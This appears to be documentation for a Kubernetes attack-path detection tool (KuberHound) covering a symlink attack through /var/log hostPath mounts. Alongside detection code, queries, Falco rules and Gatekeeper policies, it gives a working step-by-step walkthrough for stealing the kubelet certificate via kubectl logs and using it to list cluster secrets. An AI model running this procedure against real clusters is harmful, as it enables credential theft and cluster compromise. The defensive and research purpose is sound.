# Attack Path 04: Pod with /var/log Mount → Log Exfiltration → Node Escalation

## Attack Scenario

A pod with `/var/log` host mount can escalate to cluster-admin privileges through a subtle and dangerous attack that bypasses traditional container escape detection. The attack leverages symlink manipulation in pod log directories combined with legitimate Kubernetes logging APIs.

**Attack Flow**:
1. Attacker gains exec access to a pod with `/var/log` hostPath mount
2. Accesses `/var/log/pods/` directory containing all pod logs on the node
3. Deletes their own pod's log files and replaces them with symlinks to sensitive host files
4. Uses `kubectl logs` to read through the symlink, exfiltrating the kubelet certificate
5. Gains cluster-admin level access using the stolen certificate

**Why This Is Unique**:
- **No container escape needed** - uses legitimate Kubernetes logging API
- **Hard to detect** - looks like normal log access via `kubectl logs`
- **Works without privileged flag** - doesn't require privileged containers or elevated capabilities
- **Only requires /var/log mount + exec permissions** - minimal prerequisites
- **Bypasses runtime security tools** - traditional tools monitor filesystem writes, not symlink creation

## KuberHound Detection

KuberHound detects this attack vector through multiple layers:

### 1. Dangerous HostPath Detection

**File**: `collectors/pod_collector.py` (line 144-145)

The pod collector now identifies `/var/log` as a dangerous hostPath mount:

```python
if path in ["/", "/etc", "/root", "/var/run/docker.sock", "/var/run/containerd/containerd.sock",
            "/var/lib/kubelet", "/var/lib/kubelet/pki", "/etc/kubernetes", "/var/log"]:
    dangerous_host_paths.append(path)
```

Pods with `/var/log` mount will have `"/var/log"` added to their `dangerous_host_paths` property in BloodHound.

### 2. Attack Edge Creation

**File**: `edges/attack_edges.py` (line 622, 637)

KuberHound creates `EXPLOIT_HOST_WRITE` edges from Pod → Node for pods with `/var/log` mounts:

**Edge Properties**:
```json
{
  "kind": "EXPLOIT_HOST_WRITE",
  "attack_description": "Pod has dangerous hostPath mounts allowing write to host filesystem: /var/log",
  "mitre_attack": "T1611",
  "dangerous_paths": ["/var/log"],
  "techniques": [
    "Write to /etc/cron.d",
    "Modify /root/.ssh/authorized_keys",
    "Write to /etc/kubernetes",
    "Symlink attack via /var/log/pods for file exfiltration"
  ]
}
```

### 3. Detection Queries

**File**: `kuberhound_queries.json`

Two new queries enable detection and visualization:

#### Query 1: Find Pods with /var/log Mount
```cypher
MATCH (p:K8sPod) WHERE '/var/log' IN p.dangerous_host_paths RETURN p
```

**Purpose**: Quickly identify all pods with log exfiltration risk

**Category**: KuberHound - Pod Security

#### Query 2: Show Attack Path to Node
```cypher
MATCH p=(pod:K8sPod)-[:EXPLOIT_HOST_WRITE]->(n:K8sNode)
WHERE '/var/log' IN pod.dangerous_host_paths
RETURN p
```

**Purpose**: Visualize the complete escalation path from pod to node

**Category**: KuberHound - Attack Chains

## Why /var/log Is Dangerous

### The /var/log/pods/ Directory Structure

On a Kubernetes node, container logs are stored in:
```
/var/log/pods/<namespace>_<pod-name>_<pod-uid>/<container-name>/0.log
```

**Example**:
```
/var/log/pods/04-admin-exec-pod-fullnodefs_nodelog-reader_abc123/admin/0.log
```

### The Symlink Attack Vector

When a pod has `/var/log` mounted:
1. It can access `/var/log/pods/` and locate its own log directory
2. It can delete the `0.log` file and create a symlink to ANY file on the host
3. When `kubectl logs` is executed, it follows the symlink transparently
4. The target file contents are returned as "log output"

**Critical files that can be exfiltrated**:
- `/var/lib/kubelet/pki/kubelet-client-current.pem` - Kubelet client certificate (cluster-admin access)
- `/etc/kubernetes/pki/ca.crt` - Cluster CA certificate
- `/etc/kubernetes/admin.conf` - Kubeconfig with admin credentials
- `/root/.ssh/authorized_keys` - SSH keys for node access
- `/etc/shadow` - Host password hashes

### Comparison to Other Dangerous Mounts

| Mount Path | Attack Technique | Detection Difficulty | Requires Privilege | Uses K8s API |
|------------|-----------------|---------------------|-------------------|--------------|
| `/` | Direct file access | Low | No | No |
| `/etc` | Direct file write | Low | No | No |
| `/var/lib/kubelet` | Direct cert access | Medium | No | No |
| `/var/log` | **Symlink + logging API** | **High** | **No** | **Yes** |

**Why /var/log is uniquely dangerous**:
- Traditional filesystem monitoring sees symlink creation, not file reads
- `kubectl logs` is a legitimate, frequently-used operation
- No suspicious process execution or container escape
- Works through the Kubernetes API, not direct host access
- Harder to correlate symlink creation with subsequent log reads

## Testing

### 1. Deploy Test Environment

```bash
kubectl apply -f attack-paths/04-admin-exec-pod-fullnodefs.yaml
```

**Creates**:
- **Namespace**: `04-admin-exec-pod-fullnodefs`
- **ServiceAccount**: `04verify` with POD_EXEC RBAC permissions
- **Pod**: `nodelog-reader` with `/var/log` hostPath mount

**Pod Spec (Critical Parts)**:
```yaml
spec:
  containers:
  - name: admin
    image: alpine:latest
    volumeMounts:
    - name: varlog
      mountPath: /var/log
  volumes:
  - name: varlog
    hostPath:
      path: /var/log
      type: Directory
```

### 2. Collect Data with KuberHound

```bash
python3 kuberhound.py --bloodhound-url http://localhost:8080 \
  --username admin --password '<PASSWORD>'
```

**Expected Output**:
```
[+] Collecting pods...
[+] Found pod with dangerous hostPath: nodelog-reader (/var/log)
[+] Creating EXPLOIT_HOST_WRITE edge: nodelog-reader -> node
```

### 3. Verify Pod Properties in BloodHound

Run the following in the BloodHound **Cypher** search:
```cypher
MATCH (p:K8sPod {name: 'nodelog-reader'}) RETURN p.dangerous_host_paths
```

**Expected Result**:
```json
["/var/log"]
```

### 4. Verify Attack Edge Creation

```cypher
MATCH p=(pod:K8sPod {name: 'nodelog-reader'})-[:EXPLOIT_HOST_WRITE]->(n:K8sNode) RETURN p
```

**Expected Result**: Returns path showing pod → node relationship

### 5. Verify Detection Query

```cypher
MATCH (p:K8sPod) WHERE '/var/log' IN p.dangerous_host_paths RETURN p
```

**Expected Result**: Returns `nodelog-reader` pod

### 6. Verify in BloodHound UI

1. Open BloodHound at http://localhost:8080
2. Navigate to **Queries** → **Custom Queries**
3. Search for: **"KuberHound: Pods with dangerous hostPath mounts"**
4. Run the query
5. **Expected**: Graph displays `nodelog-reader` pod
6. Click on the pod node → verify properties show:
   - `dangerous_host_paths: ["/var/log"]`
7. Run second query: **"KuberHound: All container escape paths to Node"**
8. **Expected**: Graph shows path from pod to node with `EXPLOIT_HOST_WRITE` edge
9. Click the edge → verify edge properties show:
   - `techniques` includes "Symlink attack via /var/log/pods for file exfiltration"

## Exploitation Walkthrough

### Step 1: Get Exec Access to Pod

```bash
kubectl exec -it -n 04-admin-exec-pod-fullnodefs pods/nodelog-reader -- sh
```

**Inside the pod**, verify access to /var/log:
```bash
ls -la /var/log/pods/
```

**Expected Output**:
```
drwxr-xr-x 3 root root 4096 Jan 01 12:00 04-admin-exec-pod-fullnodefs_nodelog-reader_abc123/
drwxr-xr-x 3 root root 4096 Jan 01 11:00 kube-system_coredns-xyz789/
...
```

### Step 2: Locate Your Pod's Log Directory

```bash
# Find directories matching your pod's hostname
find /var/log/pods/ -type d -name "*$HOSTNAME*"
```

**Example Output**:
```
/var/log/pods/04-admin-exec-pod-fullnodefs_nodelog-reader_abc123/admin
```

### Step 3: Create Symlinks to Sensitive Files

```bash
# Replace all log files with symlinks to kubelet certificate
for i in $(find /var/log/pods/*"$HOSTNAME"* -type d); do
    rm -f $i/*.log
    ln -s /var/lib/kubelet/pki/kubelet-client-current.pem $i/0.log
done
```

**What this does**:
- Finds all log directories for your pod (typically just one, but covers multi-container pods)
- Removes existing log files (`*.log`)
- Creates symlink: `0.log` → `/var/lib/kubelet/pki/kubelet-client-current.pem`

**Verify symlink creation**:
```bash
ls -la /var/log/pods/*"$HOSTNAME"*/*/0.log
```

**Expected Output**:
```
lrwxrwxrwx 1 root root 50 Jan 01 12:05 /var/log/pods/.../admin/0.log -> /var/lib/kubelet/pki/kubelet-client-current.pem
```

### Step 4: Exfiltrate the Certificate

**Exit the pod** and run from your local machine:

```bash
# Read the certificate through kubectl logs
for i in $(seq 1 20); do
    kubectl -n 04-admin-exec-pod-fullnodefs logs pods/nodelog-reader admin --tail=$i >> cert.pem
done
```

**Why multiple iterations**:
- Kubernetes may buffer log output
- Using `--tail` with increasing values ensures complete file retrieval
- The certificate is read multiple times to ensure no truncation

### Step 5: Clean the Certificate

The extracted certificate will have log formatting artifacts. Clean it:

```bash
sed 's/failed to get parse function: unsupported log format: "/\n/g' cert.pem | tac | \
sed 's/\\n"//g' > cert_clean.pem
```

**Verify certificate format**:
```bash
cat cert_clean.pem
```

**Expected Output**:
```
-----BEGIN CERTIFICATE-----
MIIDXTCCAkWgAwIBAgIJAKZ...
...
-----END CERTIFICATE-----
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA2b7...
...
-----END RSA PRIVATE KEY-----
```

### Step 6: Use Certificate for Cluster-Admin Access

```bash
# Get API server URL
API=$(kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}')

# Test cluster-admin access with stolen certificate
kubectl --insecure-skip-tls-verify \
  --server=$API \
  --client-certificate=cert_clean.pem \
  --client-key=cert_clean.pem \
  --kubeconfig <(echo) \
  auth whoami
```

**Expected Output**:
```
Username: system:node:worker-node-1
Groups:  system:nodes, system:authenticated
```

**Verify cluster-admin permissions**:
```bash
# List all secrets in all namespaces
kubectl --insecure-skip-tls-verify \
  --server=$API \
  --client-certificate=cert_clean.pem \
  --client-key=cert_clean.pem \
  --kubeconfig <(echo) \
  get secrets -A
```

**Success**: The kubelet certificate provides node-level permissions, which typically include broad cluster access.

## Attack Path Visualization

```
┌──────────────────────────────────────────────────────────────────────┐
│                     Log Exfiltration Attack Flow                     │
└──────────────────────────────────────────────────────────────────────┘

1. Initial Access                     2. Symlink Creation
   ┌─────────────┐                       ┌─────────────┐
   │   kubectl   │                       │ Pod Process │
   │    exec     │──────────────────────▶│ rm *.log    │
   └─────────────┘                       │ ln -s /var/ │
        │                                │  lib/kubelet│
        │                                └─────────────┘
        │                                       │
        ▼                                       ▼
   ┌─────────────┐                       ┌─────────────┐
   │nodelog-reader│                      │  /var/log/  │
   │    Pod      │                       │   pods/.../ │
   │             │                       │   0.log ────┼──▶ symlink
   └─────────────┘                       └─────────────┘

3. Exfiltration                       4. Privilege Escalation
   ┌─────────────┐                       ┌─────────────┐
   │   kubectl   │                       │   kubectl   │
   │    logs     │────────▶ follows      │ --client-   │
   └─────────────┘          symlink      │ certificate │
        │                       │         └─────────────┘
        │                       ▼                │
        ▼                 ┌─────────────┐       │
   ┌─────────────┐        │ kubelet-    │       │
   │ cert.pem    │◀───────│ client-     │       │
   │ (exfil'd)   │        │ current.pem │       │
   └─────────────┘        └─────────────┘       ▼
                                           ┌─────────────┐
                                           │ Cluster-Admin│
                                           │   Access    │
                                           └─────────────┘
```

## Why Traditional Detections Miss This

| Detection Method | What It Monitors | Why It Fails |
|-----------------|------------------|--------------|
| **Falco** | Container syscalls, file access | Sees symlink creation, not subsequent read via kubectl |
| **Seccomp** | Syscall filtering | Symlink creation is a normal operation |
| **AppArmor** | File access patterns | Allows access to /var/log (required for logging) |
| **Network policies** | Network traffic | Attack uses Kubernetes API, not direct network |
| **PSP/PSA** | Pod security standards | `baseline` blocks every hostPath, but log agents usually run in `privileged` or PSA-exempt namespaces, so the mount is expected there |
| **Runtime scanners** | Process execution, container escape | No escape occurs - uses legitimate logging |
| **SIEM logs** | API audit logs | `kubectl logs` is normal operation, high frequency |

**The Detection Gap**:
- Creating symlinks is a normal filesystem operation
- `kubectl logs` is one of the most common Kubernetes commands
- Correlating symlink creation with subsequent log reads requires stateful analysis
- No process execution or network anomalies to trigger alerts

## Defense Recommendations

### 1. Pod Security Admission (PSA)

**Restrict hostPath mounts** using PSA `restricted` policy:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: production
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/warn: restricted
```

**Effect**: Blocks `/var/log` hostPath mounts entirely

### 2. OPA/Gatekeeper Policy

**Block /var/log mounts explicitly**:

```yaml
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8sblockvarlogmount
spec:
  crd:
    spec:
      names:
        kind: K8sBlockVarLogMount
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8sblockvarlogmount

        violation[{"msg": msg}] {
          volume := input.review.object.spec.volumes[_]
          volume.hostPath.path == "/var/log"
          msg := "hostPath mount to /var/log is forbidden (log exfiltration risk)"
        }
---
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sBlockVarLogMount
metadata:
  name: block-var-log-mount
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
```

### 3. RBAC Hardening

**Limit POD_EXEC permissions**:

```yaml
# ❌ BAD - Overly permissive
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-manager
rules:
- apiGroups: [""]
  resources: ["pods/exec"]
  verbs: ["create"]  # Allows exec into ALL pods

# ✅ GOOD - Restricted to specific pods
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: pod-manager
rules:
- apiGroups: [""]
  resources: ["pods/exec"]
  resourceNames: ["app-frontend", "app-backend"]  # Only specific pods
  verbs: ["create"]
```

### 4. Runtime Monitoring

**Detect symlink creation in /var/log/pods/**:

**Falco Rule**:
```yaml
- rule: Suspicious symlink creation in pod logs
  desc: Detect symlink creation in /var/log/pods/ directories
  condition: >
    evt.type = symlink and
    fd.name startswith /var/log/pods/ and
    fd.name endswith .log
  output: >
    Symlink created in pod log directory
    (user=%user.name command=%proc.cmdline file=%fd.name target=%evt.arg.target)
  priority: WARNING
  tags: [filesystem, mitre_credential_access]
```

### 5. Audit Log Analysis

**Monitor for suspicious log access patterns**:

```bash
# Detect repeated kubectl logs with --tail flag (exfiltration pattern)
kubectl logs -n kube-system kube-apiserver-master-1 | grep -E 'pods/.*/log.*tail=[0-9]{2,}'
```

**SIEM Query** (Splunk):
```spl
index=kubernetes sourcetype=kube:apiserver:audit
objectRef.resource="pods" objectRef.subresource="log"
| stats count by user.username, objectRef.namespace, objectRef.name
| where count > 10
```

### 6. Network Segmentation

**Limit node access to API server**:
- Use network policies to restrict which pods can access kube-apiserver
- Stolen kubelet certificates still require network access to API server

## MITRE ATT&CK Mapping

| Tactic | Technique | Description |
|--------|-----------|-------------|
| **Credential Access** | T1552.001 - Credentials from Files | Exfiltrate kubelet certificate from /var/lib/kubelet/pki/ |
| **Privilege Escalation** | T1611 - Escape to Host | Access host filesystem via /var/log mount |
| **Collection** | T1005 - Data from Local System | Read sensitive files from host via symlink |
| **Exfiltration** | T1020 - Automated Exfiltration | Use kubectl logs to exfiltrate data |
| **Defense Evasion** | T1036 - Masquerading | Attack disguised as legitimate log access |

## Security Implications

### Attack Prerequisites (Low Bar)

| Requirement | Difficulty | Notes |
|-------------|-----------|-------|
| Pod with /var/log mount | Low | Common in logging/monitoring pods |
| Exec permissions | Low | Often granted for debugging |
| kubectl access | Low | Any authenticated user with exec RBAC |

### Attack Impact (High)

| Impact | Severity | Details |
|--------|----------|---------|
| **Credential theft** | Critical | Kubelet certificate provides node permissions |
| **Cluster compromise** | Critical | Node permissions often include cluster-admin |
| **Persistence** | High | Can create additional backdoor accounts |
| **Lateral movement** | High | Access to all pods on the node |

### Detection Difficulty (High)

**Why it's hard to detect**:
- No container escape signatures
- Uses legitimate Kubernetes APIs
- Symlink creation is normal operation
- High volume of `kubectl logs` commands in typical clusters
- Requires stateful correlation across multiple events

## Comparison: /var/log vs Other Dangerous Mounts

| Aspect | / (root) | /var/lib/kubelet | /var/log |
|--------|----------|------------------|----------|
| **Direct file access** | ✅ Yes | ✅ Yes | ✅ Yes |
| **Credential theft** | ✅ Yes | ✅ Yes | ✅ Yes |
| **Requires symlinks** | ❌ No | ❌ No | ✅ **Yes** |
| **Uses K8s API** | ❌ No | ❌ No | ✅ **Yes** |
| **Detection difficulty** | Low | Medium | **High** |
| **Blocked by PSA baseline** | ✅ Yes | ✅ Yes | ✅ Yes (all hostPath volumes are) |
| **Looks legitimate** | ❌ No | ❌ No | ✅ **Yes** |

**Key Takeaway**: While other dangerous mounts provide more direct access, `/var/log` is uniquely stealthy because it leverages legitimate Kubernetes logging mechanisms.

## Real-World Scenarios

### Scenario 1: Logging Agent Compromise

**Setup**:
- Cluster runs Fluentd daemonset with `/var/log` mount (common pattern)
- Developer has exec access for debugging

**Attack**:
1. Developer compromised via phishing
2. Attacker execs into Fluentd pod on target node
3. Performs symlink attack to steal kubelet certificate
4. Gains cluster-admin access

**Detection**: Extremely difficult - exec into logging pods is normal for troubleshooting

### Scenario 2: CI/CD Pipeline Exploitation

**Setup**:
- CI/CD pod has `/var/log` mount for collecting build logs
- Pipeline has RBAC to exec into pods

**Attack**:
1. Attacker compromises CI/CD credentials
2. Triggers pipeline job that execs into pod
3. Automated script creates symlinks and exfiltrates certificates
4. Persistent cluster access established

**Detection**: Blends in with normal CI/CD activity

## Cleanup

```bash
# Delete test resources
kubectl delete -f attack-paths/04-admin-exec-pod-fullnodefs.yaml

# Remove exfiltrated certificate
rm -f cert.pem cert_clean.pem
```

## References

- [Kubernetes Logging Architecture](https://kubernetes.io/docs/concepts/cluster-administration/logging/)
- [Pod Security Admission](https://kubernetes.io/docs/concepts/security/pod-security-admission/)
- [MITRE ATT&CK - T1611 Escape to Host](https://attack.mitre.org/techniques/T1611/)
- [MITRE ATT&CK - T1552.001 Credentials from Files](https://attack.mitre.org/techniques/T1552/001/)
- [Falco Rules](https://falco.org/docs/rules/)
